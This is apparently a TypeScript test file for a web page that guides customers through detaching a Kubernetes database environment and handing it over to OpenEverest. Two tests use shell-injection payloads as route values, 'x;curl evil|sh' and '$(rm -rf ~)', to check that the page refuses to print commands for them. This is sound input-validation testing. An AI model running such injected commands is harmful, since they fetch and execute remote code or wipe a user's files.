import { screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AppRoutes } from "@/routes";
import { renderWithProviders } from "@/test/utils";

function jsonResponse(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

// The guide is read around a disconnect, when the environments list may no longer
// have the environment in it. It must render from the route alone.
function stubApi(connect: unknown = { hub: true, clusterRegion: "eu-central-1" }) {
  vi.stubGlobal(
    "fetch",
    vi.fn((input: RequestInfo | URL) => {
      const path = String(input).split("?")[0];
      if (path === "/api/environments") {
        return Promise.resolve(jsonResponse({ hub: true, environments: [] }));
      }
      if (path === "/api/connect") {
        return Promise.resolve(jsonResponse(connect));
      }

      return Promise.resolve(jsonResponse({}));
    }),
  );
}

afterEach(() => {
  vi.unstubAllGlobals();
});

async function renderGuide(
  route = "/environments/prod-east/openeverest?namespace=databases",
  connect?: unknown,
) {
  stubApi(connect);
  renderWithProviders(<AppRoutes />, { route });
  // The title shows at once; the steps wait for the default region.
  await screen.findByRole("region", { name: "1. Set the variables" });
}

function step(title: string) {
  return screen.getByRole("region", { name: title });
}

describe("Continue with OpenEverest guide", () => {
  it("gives the steps in the order they have to run", async () => {
    await renderGuide();

    const headings = screen.getAllByRole("heading", { level: 2 }).map((h) => h.textContent);
    expect(headings).toEqual([
      "1. Set the variables",
      "2. Check the OpenEverest version",
      "3. Detach from the control plane's Git",
      "4. Stop the agent",
      "5. Open OpenEverest",
      "6. Keep the backup user and bucket",
      "7. Remove the environment from PDS",
      "What changes",
    ]);
  });

  it("fills the variables from the route and points kubectl at this environment alone", async () => {
    await renderGuide();

    const vars = step("1. Set the variables");
    const text = vars.textContent ?? "";
    expect(text).toContain("export CLUSTER=prod-east");
    expect(text).toContain("export NAMESPACE=databases");
    await waitFor(() => expect(vars.textContent).toContain("export REGION=eu-central-1"));
    expect(text).toContain("export RELEASE=pds");
    // Its own kubeconfig, so a command cannot land on another environment.
    expect(text).toContain('export KUBECONFIG="$(mktemp)"');
    expect(text).toContain('aws eks update-kubeconfig --name "$CLUSTER" --region "$REGION"');
    // The context is saved for later blocks to compare, and printed with a
    // check that it names this environment.
    expect(text).toContain('export CONTEXT="$(kubectl config current-context)"');
    expect(text).toContain('echo "$CONTEXT" | grep -F "$CLUSTER"');
  });

  it("defaults the namespace to the one a join uses", async () => {
    await renderGuide("/environments/prod-east/openeverest");

    expect(step("1. Set the variables").textContent).toContain("export NAMESPACE=pds");
  });

  it("reads the OpenEverest version off the environment and says it is a prerelease", async () => {
    await renderGuide();

    const text = step("2. Check the OpenEverest version").textContent ?? "";
    expect(text).toContain("kubectl -n everest-system get configmap");
    expect(text).toContain("platform-versions");
    expect(text).toContain("openeverest\\.version");
    expect(text).toMatch(/prerelease/);
    expect(text).toMatch(/upgrade/);
  });

  it("stops pruning before it deletes what applied the databases", async () => {
    await renderGuide();

    const text = step("3. Detach from the control plane's Git").textContent ?? "";
    const patch = text.indexOf("patch kustomization instances");
    expect(patch).toBeGreaterThan(-1);
    expect(text).toContain('{"spec":{"prune":false}}');
    expect(patch).toBeLessThan(text.indexOf("delete kustomization instances"));
    // A failed patch must stop the delete: deleting a Kustomization that still
    // prunes deletes the databases it applied.
    expect(text).toMatch(
      /prune":false\}\}' &&\s*kubectl -n flux-system delete kustomization instances/,
    );
    for (const gone of [
      "delete gitrepository hub",
      "delete secret hub-github",
      "delete serviceaccount hub-instances",
      'delete rolebinding,role hub-instances -n "$NAMESPACE"',
    ]) {
      expect(text, gone).toContain(gone);
    }
  });

  it("detaches the monitoring Kustomization the same way, before the Git source goes", async () => {
    await renderGuide();

    const text = step("3. Detach from the control plane's Git").textContent ?? "";
    // It prunes too, so deleting it as it stands would delete what it installed.
    expect(text).toMatch(
      /patch kustomization platform --type merge -p '\{"spec":\{"prune":false\}\}' &&\s*kubectl -n flux-system delete kustomization platform/,
    );
    for (const gone of [
      "delete serviceaccount hub-platform",
      "delete rolebinding,role hub-platform -n everest-system",
    ]) {
      expect(text, gone).toContain(gone);
    }
    const source = text.indexOf("delete gitrepository hub");
    expect(text.indexOf("delete kustomization instances")).toBeLessThan(source);
    expect(text.indexOf("delete kustomization platform")).toBeLessThan(source);
    expect(text).toMatch(/no monitoring/i);
  });

  it("leaves the databases and the controllers alone", async () => {
    await renderGuide();

    const text = step("3. Detach from the control plane's Git").textContent ?? "";
    expect(text).not.toMatch(/delete (instances?|pvc|namespace|all)\b|delete -f/);
    expect(text).not.toMatch(/uninstall|delete crd|delete deploy/);
    expect(text).toMatch(/controllers stay/);
  });

  it("checks kubectl is on this environment before each command that changes it", async () => {
    await renderGuide();

    const guard = '[ "$(kubectl config current-context)" = "${CONTEXT:?}" ] &&';
    for (const title of [
      "3. Detach from the control plane's Git",
      "4. Stop the agent",
      "5. Open OpenEverest",
    ]) {
      expect(step(title).textContent, title).toContain(guard);
    }
    // Both blocks of step 3 change the environment, so both start with the check.
    const detach = step("3. Detach from the control plane's Git").textContent ?? "";
    expect(detach.split(guard)).toHaveLength(4);
    expect(detach).toMatch(/"\$\{CONTEXT:\?\}" \] &&\s*kubectl -n flux-system patch/);
  });

  it("compares the context for equality, never by searching for the environment name", async () => {
    await renderGuide();

    // A name search accepts a context for "production" when the environment is "prod".
    for (const title of [
      "3. Detach from the control plane's Git",
      "4. Stop the agent",
      "5. Open OpenEverest",
    ]) {
      expect(step(title).textContent, title).not.toMatch(/grep/);
    }
  });

  it("scales the agent to zero, including the one an older join leaves in its own namespace", async () => {
    await renderGuide();

    const text = step("4. Stop the agent").textContent ?? "";
    expect(text).toContain(
      'kubectl -n everest-system scale deploy "${RELEASE}-adapter" --replicas=0',
    );
    // No xargs: the BSD one on older macOS rejects -r, and a pipe hides a failed get.
    expect(text).not.toMatch(/xargs/);
    expect(text).toContain(
      'legacy="$(kubectl get deploy pds-agent -n pds-agent -o name --ignore-not-found)" &&',
    );
    expect(text).toContain(
      '{ [ -z "$legacy" ] || kubectl scale -n pds-agent --replicas=0 "$legacy"; }',
    );
  });

  it("says an upgrade brings the agent and its token back", async () => {
    await renderGuide();

    const text = step("4. Stop the agent").textContent ?? "";
    expect(text).toMatch(/starts the agent again and creates its token Secret again/);
    expect(text).toMatch(/repeat this step and the token deletion in step 5/);
  });

  it("opens the UI through a port-forward and reads the password with a command", async () => {
    await renderGuide();

    const text = step("5. Open OpenEverest").textContent ?? "";
    expect(text).toContain("kubectl -n everest-system port-forward svc/everest 8080:8080");
    expect(text).toContain("http://localhost:8080");
    expect(text).toContain("get secret everest-accounts");
    expect(text).toContain("users\\.yaml");
    expect(text).toMatch(/change it/i);
    expect(text).toContain('delete secret "${RELEASE}-everest"');
    expect(text).toContain("delete secret pds-everest -n pds-agent --ignore-not-found");
  });

  it("never shows a password, only the command that reads one", async () => {
    await renderGuide();

    expect(screen.queryByRole("textbox")).not.toBeInTheDocument();
    expect(screen.queryByLabelText(/password/i)).not.toBeInTheDocument();
    // The Secret is read inside a command the customer runs, and named nowhere else.
    const outsideCommands = [...document.querySelectorAll("main p, main h1, main h2")]
      .map((el) => el.textContent)
      .join(" ");
    expect(outsideCommands).not.toMatch(/passwordHash/);
    expect(step("5. Open OpenEverest").textContent).toContain("get secret everest-accounts");
  });

  it("keeps the backup user and bucket, because backups still write with them", async () => {
    await renderGuide();

    const text = step("6. Keep the backup user and bucket").textContent ?? "";
    expect(text).toMatch(/backups still write/i);
    expect(text).toContain("pds-prod-east");
    expect(text).toMatch(/do not run the delete command/);
  });

  it("ends by telling the customer to click Remove", async () => {
    await renderGuide();

    expect(step("7. Remove the environment from PDS").textContent).toMatch(/Remove/);
  });

  it("says what changes, points at support and links the delete command with a warning", async () => {
    await renderGuide();

    const changes = screen.getByRole("region", { name: "What changes" });
    const text = changes.textContent ?? "";
    expect(text).toMatch(/no changes, monitoring or support cases/);
    expect(text).toMatch(/upgrades are yours/i);
    expect(text).toMatch(/support agreement/i);
    expect(text).not.toMatch(/guarantee|covered|will support/i);
    expect(within(changes).getByRole("link", { name: "View delete command" })).toHaveAttribute(
      "href",
      "/environments/prod-east/aws-cleanup?namespace=databases",
    );
    // The delete command removes what this hand-over keeps.
    expect(text).toMatch(/it deletes the databases, the backup user and the backup bucket/);
  });

  it("renders after the environment is gone from the environments list", async () => {
    await renderGuide("/environments/long-gone/openeverest?namespace=databases");

    expect(step("1. Set the variables").textContent).toContain("export CLUSTER=long-gone");
  });

  it("shows no command until the default region has been read", async () => {
    let answer: (response: Response) => void = () => {};
    vi.stubGlobal(
      "fetch",
      vi.fn((input: RequestInfo | URL) => {
        const path = String(input).split("?")[0];
        if (path === "/api/connect") {
          return new Promise<Response>((resolve) => {
            answer = resolve;
          });
        }

        return Promise.resolve(jsonResponse({ hub: true, environments: [] }));
      }),
    );
    renderWithProviders(<AppRoutes />, { route: "/environments/prod-east/openeverest" });

    // A command copied now would carry the fallback region, and a same-named
    // environment in that region would be the one step 1 saves and trusts.
    await screen.findByRole("heading", { level: 1, name: "Continue with OpenEverest" });
    expect(document.querySelector("pre")).toBeNull();
    expect(document.body.textContent).not.toContain("us-west-2");

    answer(jsonResponse({ hub: true, clusterRegion: "eu-central-1" }));

    await waitFor(() =>
      expect(step("1. Set the variables").textContent).toContain("export REGION=eu-central-1"),
    );
  });

  it("says so when the default region could not be read", async () => {
    vi.stubGlobal(
      "fetch",
      vi.fn((input: RequestInfo | URL) => {
        const path = String(input).split("?")[0];
        if (path === "/api/connect") {
          return Promise.resolve(jsonResponse({ message: "boom" }, 500));
        }

        return Promise.resolve(jsonResponse({ hub: true, environments: [] }));
      }),
    );
    renderWithProviders(<AppRoutes />, { route: "/environments/prod-east/openeverest" });

    expect(await screen.findByText(/region could not be read/)).toBeInTheDocument();
  });

  it("refuses to print commands for a name that is not an environment name", async () => {
    stubApi();
    renderWithProviders(<AppRoutes />, { route: "/environments/x%3Bcurl%20evil%7Csh/openeverest" });

    expect(await screen.findByText(/is not an environment name/)).toBeInTheDocument();
    expect(screen.queryByRole("region", { name: "1. Set the variables" })).not.toBeInTheDocument();
    expect(document.body.textContent).not.toContain("curl evil");
  });

  it("refuses to print commands for a namespace that is not a namespace", async () => {
    stubApi();
    renderWithProviders(<AppRoutes />, {
      route: "/environments/prod-east/openeverest?namespace=%24(rm%20-rf%20~)",
    });

    expect(await screen.findByText(/is not a namespace/)).toBeInTheDocument();
    expect(screen.queryByRole("region", { name: "1. Set the variables" })).not.toBeInTheDocument();
    expect(document.body.textContent).not.toContain("rm -rf");
  });

  it("names OpenEverest but nothing else the control plane runs", async () => {
    await renderGuide();

    // Commands name resources on the customer's own environment, which is theirs
    // to see. The prose around them names what happens, not what Percona runs.
    const main = document.querySelector("main") ?? document.body;
    const prose = [...main.querySelectorAll("p, h1, h2, th, td, li, a")]
      .map((el) => el.textContent)
      .join(" ");
    expect(prose).toMatch(/OpenEverest/);
    expect(prose).not.toMatch(/pmm|flux|adapter|\bhub\b|spoke|the operator/i);
    expect(main.textContent).not.toMatch(/openeverest\.io|pmm/i);
  });
});
